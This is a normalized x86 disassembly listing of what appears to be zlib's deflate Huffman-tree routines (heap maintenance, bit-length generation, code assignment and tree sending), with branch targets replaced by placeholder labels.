mov dl [ ecx + 0x1450 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb58 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + eax * 4 + 0xb54 ]
mov [ ecx + 0xb58 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1448 ] edx
push 0x1
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40998e
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb58 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x144c ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x144c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x144c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ ecx + eax * 4 + 0xb54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x144c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + ecx * 4 + 0xb54 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
xor esi esi
mov si [ edx + ecx * 4 ]
add eax esi
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] ax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax + 0x1450 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x1450 ]
cmp ecx eax
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x144c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xb58 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409b2d
add esp 0x8
mov ecx [ ebp + 0x8 ]
add ecx 0xb34
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_409e60
add esp 0xc
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x24 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1450 ] dl
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2 ] ax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2 ] ax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0xb58 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
push 0x1
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40998e
add esp 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1448 ] 0x2
jge r-xdata
sub_40998e
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb54 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
shl eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0xb54 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x1448 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + eax * 4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0xc ]
xor esi esi
mov si [ ecx + eax * 4 ]
cmp edx esi
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xb58 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0xb54 ]
mov edx [ ebp + 0xc ]
xor esi esi
mov si [ edx + ecx * 4 ]
cmp eax esi
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0xb54 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov si [ eax + edx * 4 ]
cmp ecx esi
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb58 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0xb54 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov si [ eax + edx * 4 ]
cmp ecx esi
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0xb54 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x1450 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov bl [ ecx + eax + 0x1450 ]
cmp edx ebx
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xb58 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + eax + 0x1450 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov bl [ ecx + eax + 0x1450 ]
cmp edx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x1448 ]
jg r-xdata
sub_409b2d
push ebp
mov ebp esp
sub esp 0x34
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
cmp [ ebp - 0x18 ] 0xf
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xb54 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 + 0x2 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0xb34 ] 0x0
jmp r-xdata
cmp [ ebp - 0x20 ] 0x23d
jge r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb54 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x2 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x8 ]
jle r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
mov cx [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0x2 ] cx
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x34 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 2 + 0xb34 ]
sub dx 0x1
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0xb34 ] dx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 2 + 0xb36 ]
add cx 0x2
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 2 + 0xb36 ] cx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 2 + 0xb34 ]
sub ax 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 2 + 0xb34 ] ax
mov eax [ ebp - 0xc ]
sub eax 0x2
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jg r-xdata
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 2 + 0xb34 ]
add dx 0x1
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 2 + 0xb34 ] dx
mov [ ebp - 0x24 ] 0x0
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x2c ]
jl r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 2 + 0xb34 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ecx + eax * 4 ]
mov [ ebp - 0x1c ] dx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x24 ]
imul eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x16a0 ]
add ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
xor esi esi
mov si [ edx + ecx * 4 + 0x2 ]
add esi [ ebp - 0x24 ]
imul eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a4 ]
add edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a4 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 2 + 0xb34 ]
mov [ ebp - 0x30 ] edx
jmp r-xdata
mov eax [ ebp - 0x20 ]
sub eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xb54 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x34 ]
jle r-xdata
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x30 ]
sub eax 0x1
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
mov edx [ ebp - 0x18 ]
sub edx ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
xor esi esi
mov si [ ecx + eax * 4 ]
imul edx esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16a0 ]
add ecx edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ebp - 0x18 ]
mov [ ecx + eax * 4 + 0x2 ] dx
cmp [ ebp - 0x30 ] 0x0
je r-xdata
sub_409e60
push ebp
mov ebp esp
sub esp 0x34
push esi
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0xf
jg r-xdata
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x28 ]
and ecx 0xffff
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
xor esi esi
mov si [ eax + edx * 2 - 0x2 ]
add ecx esi
shl ecx 0x1
mov [ ebp - 0x28 ] cx
mov ecx [ ebp - 0x4 ]
mov dx [ ebp - 0x28 ]
mov [ ebp + ecx * 2 - 0x24 ] dx
jmp r-xdata
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x2 ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x30 ]
xor ecx ecx
mov cx [ ebp + eax * 2 - 0x24 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x34 ]
push edx
mov eax [ ebp - 0x30 ]
mov cx [ ebp + eax * 2 - 0x24 ]
add cx 0x1
mov edx [ ebp - 0x30 ]
mov [ ebp + edx * 2 - 0x24 ] cx
call sub_40bb9c
add esp 0x8
mov ecx [ ebp - 0x2c ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] ax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
sub_409f25
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb14 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x8c
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409fdc
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xb20 ]
push edx
mov eax [ ebp + 0x8 ]
add eax 0x980
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_409fdc
add esp 0xc
mov edx [ ebp + 0x8 ]
add edx 0xb28
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4095ee
add esp 0x8
mov [ ebp - 0x4 ] 0x12
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
imul eax eax 0x3
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a0 ]
lea eax [ edx + eax + 0xe ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a0 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + r--data ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0xa76 ]
test edx edx
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_409fdc
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x18 ] 0xffffffff
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax + edx * 4 + 0x6 ] 0xffff
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
mov edx [ ebp - 0x1c ]
cmp edx [ ebp + 0x10 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x6 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 4 + 0xa74 ]
add cx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xa74 ] cx
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xabc ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xabc ] dx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xab8 ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xab8 ] dx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0xab4 ]
add dx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xab4 ] dx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov cx [ eax + edx * 4 + 0xa74 ]
add cx 0x1
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0xa74 ] cx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov [ ebp - 0xc ] 0x8a
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x6
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
jmp r-xdata
sub_40a179
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x8 ] 0x5
mov eax 0x10
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp + 0xc ]
sub edx 0x101
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0xc ]
sub edx 0x101
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0xc ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x8 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x14 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x10 ] 0x5
mov edx 0x10
sub edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov edx [ ebp + 0x14 ]
sub edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x14 ]
sub ecx 0x4
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x1c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
mov edx 0x10
sub edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
sub edx 0x1
push edx
mov eax [ ebp + 0x8 ]
add eax 0x8c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a69c
add esp 0xc
mov edx [ ebp + 0x10 ]
sub edx 0x1
push edx
mov eax [ ebp + 0x8 ]
add eax 0x980
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a69c
add esp 0xc
mov esp ebp
pop ebp
retn
mov [ ebp - 0x20 ] 0x3
mov ecx 0x10
